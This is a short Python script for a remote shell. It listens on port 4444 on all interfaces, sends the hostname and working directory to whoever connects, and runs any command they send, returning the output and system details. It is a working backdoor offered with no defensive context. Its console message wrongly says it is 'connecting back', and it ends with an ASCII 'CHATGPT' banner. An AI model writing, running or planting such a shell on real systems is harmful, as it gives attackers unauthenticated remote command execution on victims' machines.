1| import socket
2| import subprocess
3| import os
4| import shlex
5| import platform
6| 
7| class RemoteShell:
8|     def __init__(self, port=4444):
9|         self.PORT = port
10| 
11|     def execute_command(self, command):
12|         try:
13|             command = shlex.split(command)
14|             output = subprocess.check_output(command, stderr=subprocess.STDOUT)
15|             return output.decode()
16|         except subprocess.CalledProcessError as e:
17|             return str(e)
18|         except Exception as e:
19|             return str(e)
20| 
21|     def get_system_info(self):
22|         try:
23|             system_info = f"System: {platform.system()} {platform.release()}\n"
24|             system_info += f"Node Name: {platform.node()}\n"
25|             system_info += f"Processor: {platform.processor()}\n"
26|             system_info += f"Machine: {platform.machine()}\n"
27|             system_info += f"Python Version: {platform.python_version()}\n"
28|             return system_info
29|         except Exception as e:
30|             return str(e)
31| 
32|     def main(self):
33|         print("Connecting back to the host machine...")
34|         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
35|         server.bind(('0.0.0.0', self.PORT))
36|         server.listen(1)
37|         connection, address = server.accept()
38| 
39|         with connection:
40|             print("Connection successful")
41|             hostname = socket.gethostname()
42|             connection.send(f"Machine name: {hostname}\n".encode())
43|             connection.send(f"Current directory: {os.getcwd()}\n".encode())
44| 
45|             while True:
46|                 try:
47|                     command = connection.recv(1024).decode()
48|                     if command.strip().lower() == 'exit':
49|                         break
50|                     elif command.strip().lower() == 'system_info':
51|                         system_info = self.get_system_info()
52|                         connection.send(system_info.encode())
53|                     else:
54|                         output = self.execute_command(command)
55|                         connection.send(output.encode())
56|                 except Exception as e:
57|                     connection.send(f"Error: {e}\n".encode())
58| 
59| if __name__ == "__main__":
60|     remote_shell = RemoteShell()
61|     remote_shell.main()
62| 
63| print("   CCCC  H   H    A   TTTTT  GGGG  PPPP  TTTTT")
64| print("  C      H   H   A A    T   G      P   P   T")
65| print("  C      HHHHH  AAAAA   T   G  GG  PPPP    T")
66| print("  C      H   H  A   A   T   G   G  P       T")
67| print("   CCCC  H   H  A   A   T    GGG   P       T")
